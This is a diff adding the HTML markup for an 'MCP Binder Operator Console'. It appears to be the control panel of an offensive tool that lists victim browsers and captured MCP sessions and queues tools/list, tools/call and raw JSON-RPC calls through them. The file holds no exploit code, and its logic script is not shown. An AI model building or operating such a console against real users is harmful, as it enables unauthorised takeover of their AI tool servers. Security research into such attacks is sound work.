@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>MCP Binder Operator Console</title>
+    <link rel="stylesheet" href="./operator.css">
+  </head>
+  <body>
+    <main class="operatorShell">
+      <header class="topbar">
+        <div>
+          <p class="eyebrow">MCP Binder</p>
+          <h1>MCP Binder Operator</h1>
+        </div>
+        <div class="topActions">
+          <span id="statusBadge" class="badge">Offline</span>
+          <button id="refreshButton" type="button">Refresh</button>
+          <button id="clearButton" class="secondary" type="button">Clear</button>
+          <button id="exportButton" class="secondary" type="button">Export</button>
+        </div>
+      </header>
+
+      <section class="configBar" aria-labelledby="dashboardTitle">
+        <h2 id="dashboardTitle">Dashboard</h2>
+        <label class="field">
+          <span>Remote base</span>
+          <input id="dashboardBaseInput" placeholder="http://dashboard.example.com:8090" autocomplete="off" spellcheck="false">
+        </label>
+        <label class="field compact">
+          <span>Token</span>
+          <input id="dashboardTokenInput" type="password" autocomplete="off">
+        </label>
+      </section>
+
+      <section class="workspace">
+        <aside class="rail">
+          <section class="panel railPanel" aria-labelledby="victimsTitle">
+            <div class="panelHeader">
+              <h2 id="victimsTitle">Victims</h2>
+              <span id="victimCount" class="statusText">0</span>
+            </div>
+            <div id="victimsList" class="scrollList empty">No victim browsers.</div>
+          </section>
+
+          <section class="panel railPanel" aria-labelledby="sessionsTitle">
+            <div class="panelHeader">
+              <h2 id="sessionsTitle">Sessions</h2>
+              <span id="sessionCount" class="statusText">0</span>
+            </div>
+            <div id="sessionsList" class="scrollList empty">No captured sessions.</div>
+          </section>
+        </aside>
+
+        <section class="mainPane">
+          <section class="panel sessionHero" aria-labelledby="selectedTitle">
+            <div>
+              <h2 id="selectedTitle">Selected MCP</h2>
+              <p id="selectedSessionLabel">No session</p>
+            </div>
+            <div class="metrics">
+              <div><strong id="toolCount">0</strong><span>tools</span></div>
+              <div><strong id="resultCount">0</strong><span>results</span></div>
+            </div>
+          </section>
+
+          <section class="operationGrid">
+            <section class="panel operatePanel" aria-labelledby="operateTitle">
+              <div class="panelHeader">
+                <h2 id="operateTitle">Operate</h2>
+                <span class="statusText">queued through captured session</span>
+              </div>
+              <div class="actions">
+                <button id="toolsListButton" type="button" disabled>tools/list</button>
+                <button id="toolCallButton" class="secondary" type="button" disabled>tools/call</button>
+                <button id="rawRpcButton" class="secondary" type="button" disabled>Raw RPC</button>
+              </div>
+              <label class="field">
+                <span>Tool</span>
+                <select id="toolSelect" disabled></select>
+              </label>
+              <label class="field">
+                <span>Arguments JSON</span>
+                <textarea id="toolArgsInput">{}</textarea>
+              </label>
+              <label class="field">
+                <span>Raw JSON-RPC</span>
+                <textarea id="rawRpcInput">{"jsonrpc":"2.0","id":1,"method":"tools/list","params":{}}</textarea>
+              </label>
+            </section>
+
+            <section class="panel" aria-labelledby="toolsTitle">
+              <div class="panelHeader">
+                <h2 id="toolsTitle">Discovered MCP Tools</h2>
+                <span id="toolInventoryState" class="statusText">empty</span>
+              </div>
+              <div id="toolsList" class="scrollList empty">No tools captured yet.</div>
+            </section>
+          </section>
+
+          <section class="panel resultsPanel" aria-labelledby="resultsTitle">
+            <div class="panelHeader">
+              <h2 id="resultsTitle">Tasks And Results</h2>
+              <span id="timelineState" class="statusText">idle</span>
+            </div>
+            <div id="resultsList" class="timeline empty">No tasks or results for this session.</div>
+          </section>
+
+          <details class="panel evidencePanel">
+            <summary>Raw Evidence</summary>
+            <pre id="rawEvidence">{}</pre>
+          </details>
+        </section>
+      </section>
+    </main>
+
+    <script type="module" src="./operator.js"></script>
+  </body>
+</html>
